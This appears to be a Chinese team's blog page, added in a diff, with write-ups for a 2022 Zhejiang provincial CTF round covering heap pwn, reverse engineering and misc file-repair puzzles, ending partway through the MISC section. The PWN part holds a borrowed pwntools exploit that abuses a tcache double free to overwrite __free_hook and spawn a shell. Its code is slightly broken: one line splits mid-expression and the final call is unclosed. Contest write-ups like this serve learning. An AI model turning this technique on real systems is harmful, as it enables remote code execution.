@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 5.4.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hackerone-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hackerone-16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="题目附件下载地址  PWNbabyheap这道题是2.27下的一个tcache利用，因为有UAF，所以很容易的就可以泄露出堆地址。再利用tcache double free可以轻易释放堆块到unsorted bin中去，然后就可以泄露libc地址。然后通过修改fd指针，部署堆块到free hook上，并将其覆盖为onegadget，最后free触发onegadget获得shell。 EXP： 1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022浙江省ctf初赛">
+<meta property="og:url" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/index.html">
+<meta property="og:site_name" content="230">
+<meta property="og:description" content="题目附件下载地址  PWNbabyheap这道题是2.27下的一个tcache利用，因为有UAF，所以很容易的就可以泄露出堆地址。再利用tcache double free可以轻易释放堆块到unsorted bin中去，然后就可以泄露libc地址。然后通过修改fd指针，部署堆块到free hook上，并将其覆盖为onegadget，最后free触发onegadget获得shell。 EXP： 1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204556151.png">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204745404.png">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204900834.png">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920205002693.png">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image002.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image004.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image006.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image008.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image010.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image012.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image014.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image016.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image018.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image020.jpg">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image022.jpg">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image024.jpg">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image026.jpg">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image028.jpg">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image030.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image032.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image034.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image036.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image038.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image040.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image042.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image044.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image046.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image048.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image050.gif">
+<meta property="og:image" content="e:/笔记/pwn/临时笔记/2022浙江省ctf初赛/clip_image052.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image054.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image056.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image058.gif">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image002.jpg">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image004.jpg">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image006.jpg">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image007.png">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image009.jpg">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image011.jpg">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image013.jpg">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image015.jpg">
+<meta property="og:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image017.jpg">
+<meta property="article:published_time" content="2022-09-20T13:16:00.000Z">
+<meta property="article:modified_time" content="2022-09-20T13:17:14.150Z">
+<meta property="article:author" content="R3ape1">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="misc">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="re">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204556151.png">
+
+
+<link rel="canonical" href="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/","path":"2022/09/20/2022浙江省ctf初赛/","title":"2022浙江省ctf初赛"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2022浙江省ctf初赛 | 230</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">230</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">R3ape1团队笔记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">1.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap"><span class="nav-number">1.1.</span> <span class="nav-text">babyheap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RE"><span class="nav-number">2.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ManyCheck"><span class="nav-number">2.1.</span> <span class="nav-text">ManyCheck</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A5%BD%E6%80%AA%E5%93%A6"><span class="nav-number">3.1.</span> <span class="nav-text">好怪哦</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A5%9E%E5%A5%87%E7%9A%84%E6%A3%8B%E7%9B%98"><span class="nav-number">3.2.</span> <span class="nav-text">神奇的棋盘</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#segmentFlow"><span class="nav-number">3.3.</span> <span class="nav-text">segmentFlow</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">4.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web1"><span class="nav-number">4.1.</span> <span class="nav-text">Web1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web2"><span class="nav-number">4.2.</span> <span class="nav-text">Web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web3"><span class="nav-number">4.3.</span> <span class="nav-text">Web3</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="R3ape1"
+      src="/images/head.png">
+  <p class="site-author-name" itemprop="name">R3ape1</p>
+  <div class="site-description" itemprop="description">青年们要充分认识自己所负的重任</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="mailto:1695672857@qq.com" title="E-Mail → mailto:1695672857@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="R3ape1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="230">
+      <meta itemprop="description" content="青年们要充分认识自己所负的重任">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2022浙江省ctf初赛 | 230">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2022浙江省ctf初赛
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-09-20 21:16:00 / 修改时间：21:17:14" itemprop="dateCreated datePublished" datetime="2022-09-20T21:16:00+08:00">2022-09-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/Eu21ka/pwn-exercises/tree/main/2022%E6%B5%99%E6%B1%9F%E7%9C%81%E8%B5%9B">题目附件下载地址</a></p>
+</blockquote>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>这道题是2.27下的一个tcache利用，因为有UAF，所以很容易的就可以泄露出堆地址。再利用tcache double free可以轻易释放堆块到unsorted bin中去，然后就可以泄露libc地址。然后通过修改fd指针，部署堆块到free hook上，并将其覆盖为onegadget，最后free触发onegadget获得shell。</p>
+<p><strong>EXP：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">x,file_name</span>):</span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;1.14.97.218&#x27;</span>,<span class="number">22785</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),p,ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">ch</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input your choice: &#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,payload</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;input content: &#x27;</span>,payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">elf,p,libc=conn(<span class="number">0</span>,<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">heap=u64(p.recvline().replace(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line">success(<span class="string">&#x27;heap:&#x27;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">1</span>,p64(heap+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x7f</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\x07&#x27;</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">96</span>-<span class="number">0x10</span>-</span><br><span class="line">libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x28</span>)<span class="comment">#6</span></span><br><span class="line">edit(<span class="number">6</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive(</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这周虚拟机崩了，之前写的脚本也就丢失了，所以就直接拿了别的师傅的exp，和我的攻击思路应该大差不差。</p>
+</blockquote>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="ManyCheck"><a href="#ManyCheck" class="headerlink" title="ManyCheck"></a>ManyCheck</h2><p>第一个检查是猜幸运数字，把程序拖进ida，通过字符串查询“First check”就可以立马定位到如下图所示的函数，然后易得出那个要猜的数字就是<code>77</code></p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204556151.png" class="" title="image-20220920204556151">
+
+<p>第二个检查根据问题敲敲计算器就可以计算出<code>55</code>和<code>49</code>两个答案，程序中的判断如下图所示</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204745404.png" class="" title="image-20220920204745404">
+
+<p>第三个检查依旧可以利用字符串查找来定位到关键函数，可看到下图中的11行就是判断</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920204900834.png" class="" title="image-20220920204900834">
+
+<p>最后可以看到如下图所示的运算</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/image-20220920205002693.png" class="" title="image-20220920205002693">
+
+<p>是循环移位，直接用python跑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x=<span class="number">1718896489</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(x&gt;&gt;<span class="number">16</span>)+((x&amp;(<span class="number">2</span>**<span class="number">16</span>-<span class="number">1</span>))&lt;&lt;<span class="number">16</span>)</span><br><span class="line"><span class="number">1198089844</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="好怪哦"><a href="#好怪哦" class="headerlink" title="好怪哦"></a>好怪哦</h2><p>下载附件，发现是个损坏的压缩包，用winhex打开看看</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image002.gif" class="" title="图片">
+
+<p>发现是都翻转过的16进制，于是用随波逐流进行hex_str翻转</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image004.gif" class="" title="图片">
+
+<p>复制翻转修复好的16进制码，在winhex中还原出新的压缩包</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image006.gif" class="" title="图片">
+
+<p>保存好后打开压缩包，一张损坏的png图片，同样拉进winhex</p>
+<p>发现缺少png文件头，89504E47给它补上</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image008.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image010.gif" class="" title="图片">
+
+<p>发现是一半的图片，修改高度得到flag</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image012.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image014.gif" class="" title="图片">
+
+<p>DASCTF{f8b275b06baf4204fa62743eab5eca98}</p>
+<h2 id="神奇的棋盘"><a href="#神奇的棋盘" class="headerlink" title="神奇的棋盘"></a>神奇的棋盘</h2><p>下载附件</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image016.gif" class="" title="图片">
+
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image018.gif" class="" title="图片">
+
+<p>看了眼附件，应该是棋盘加密，拿原先的棋盘对比一下</p>
+<img src="/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/clip_image020.jpg" class="" title="图片">
+
+<p>对照替换</p>
